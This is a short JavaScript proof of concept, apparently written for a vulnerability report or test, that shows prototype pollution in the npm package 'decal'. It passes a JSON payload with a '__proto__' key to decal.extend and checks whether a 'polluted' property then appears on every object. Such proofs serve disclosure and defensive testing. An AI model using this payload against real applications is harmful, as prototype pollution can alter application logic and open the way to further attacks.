Reflect.getPrototypeOf = () => false;
const decal = require('decal');
console.log({}.polluted);
const o = JSON.parse('{"__proto__":{"polluted":"yes"}}');
decal.extend({}, true, o);
console.log({}.polluted);